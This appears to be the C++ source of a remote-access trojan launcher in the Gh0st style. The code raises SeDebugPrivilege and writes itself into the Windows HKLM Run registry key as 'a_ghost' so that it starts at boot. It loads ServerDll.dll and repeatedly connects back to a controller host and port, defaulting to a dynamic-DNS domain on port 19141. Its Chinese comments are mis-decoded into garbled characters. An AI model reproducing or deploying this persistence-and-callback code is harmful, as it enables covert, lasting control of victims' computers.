#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <corecrt_io.h>

typedef void (*StopRun)();

typedef bool (*IsStoped)();

// ֹͣ��������
StopRun stop = NULL;

// �Ƿ�ɹ�ֹͣ
IsStoped bStop = NULL;

// �Ƿ��˳����ض�
IsStoped bExit = NULL;

BOOL status = 0;

struct CONNECT_ADDRESS
{
	DWORD dwFlag;
	char  szServerIP[MAX_PATH];
	int   iPort;
}g_ConnectAddress={0x1234567,"",0};

//����Ȩ��
void DebugPrivilege()
{
	HANDLE hToken = NULL;
	//�򿪵�ǰ���̵ķ�������
	int hRet = OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken);

	if( hRet)
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		//ȡ������Ȩ�޵�LUID
		LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		//�����������Ƶ�Ȩ��
		AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(tp),NULL,NULL);

		CloseHandle(hToken);
	}
}

/** 
* @brief ���ñ�����������
* @param[in] *sPath ע����·��
* @param[in] *sNmae ע���������
* @return ����ע����
* @details Win7 64λ�����ϲ��Խ��������ע�����ڣ�\n
* HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
* @note �״�������Ҫ�Թ���ԱȨ�����У�������ע���д�뿪��������
*/
BOOL SetSelfStart(const char *sPath, const char *sNmae)
{
	DebugPrivilege();

	// д���ע���·��
#define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"

	// ��ע�����д��������Ϣ
	HKEY hKey = NULL;
	LONG lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);

	// �ж��Ƿ�ɹ�
	if(lRet != ERROR_SUCCESS)
		return FALSE;

	lRet = RegSetValueExA(hKey, sNmae, 0, REG_SZ, (const BYTE*)sPath, strlen(sPath) + 1);

	// �ر�ע���
	RegCloseKey(hKey);

	// �ж��Ƿ�ɹ�
	return lRet == ERROR_SUCCESS;
}

BOOL CALLBACK callback(DWORD CtrlType)
{
	if (CtrlType == CTRL_CLOSE_EVENT)
	{
		status = 1;
		if(stop) stop();
		while(1==status)
			Sleep(20);
	}
	return TRUE;
}

// @brief ���ȶ�ȡsettings.ini�����ļ�����ȡIP�Ͷ˿�.
// [settings] 
// localIp=XXX
// ghost=6688
// ��������ļ������ھʹ��������л�ȡIP�Ͷ˿�.
int main(int argc, const char *argv[])
{
	if(!SetSelfStart(argv[0], "a_ghost"))
	{
		std::cout<<"���ÿ���������ʧ�ܣ����ù���ԱȨ������.\n";
	}
	status = 0;
	SetConsoleCtrlHandler(&callback, TRUE);
	char path[_MAX_PATH], *p = path;
	GetModuleFileNameA(NULL, path, sizeof(path));
	while (*p) ++p;
	while ('\\' != *p) --p;
	strcpy(p+1, "ServerDll.dll");
	HMODULE hDll = LoadLibraryA(path);
	typedef void (*TestRun)(char* strHost,int nPort);
	TestRun run = hDll ? TestRun(GetProcAddress(hDll, "TestRun")) : NULL;
	stop = hDll ? StopRun(GetProcAddress(hDll, "StopRun")) : NULL;
	bStop = hDll ? IsStoped(GetProcAddress(hDll, "IsStoped")) : NULL;
	bExit = hDll ? IsStoped(GetProcAddress(hDll, "IsExit")) : NULL;
	if (run)
	{
		char *ip = g_ConnectAddress.szServerIP;
		int &port = g_ConnectAddress.iPort;
		if (0 == strlen(ip))
		{
			strcpy(p+1, "settings.ini");
			if (_access(path, 0) == -1){
				ip = argc > 1 ? argv[1] : "127.0.0.1";
				port = argc > 2 ? atoi(argv[2]) : 19141;
			}
			else {
				GetPrivateProfileStringA("settings", "localIp", "yuanyuanxiang.oicp.net", ip, _MAX_PATH, path);
				port = GetPrivateProfileIntA("settings", "ghost", 19141, path);
			}
		}
		printf("[server] %s:%d\n", ip, port);
		do 
		{
			run(ip, port);
			while(bStop && !bStop() && 0 == status)
				Sleep(20);
		} while (bExit && !bExit() && 0 == status);

		while(bStop && !bStop() && 1 == status)
			Sleep(20);
	}
	else {
		printf("���ض�̬���ӿ�\"ServerDll.dll\"ʧ��.\n");
		Sleep(3000);
	}
	status = 0;
	return -1;
}
